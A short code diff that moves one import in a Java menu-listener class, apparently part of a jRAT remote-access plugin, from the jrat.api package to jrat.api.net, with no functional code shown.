@@ -4,8 +4,8 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.util.List;
 
-import jrat.api.PacketBuilder;
 import jrat.api.Client;
+import jrat.api.net.PacketBuilder;
 import jrat.api.ui.RATMenuItemActionListener;
 
 public class MenuListener implements RATMenuItemActionListener {
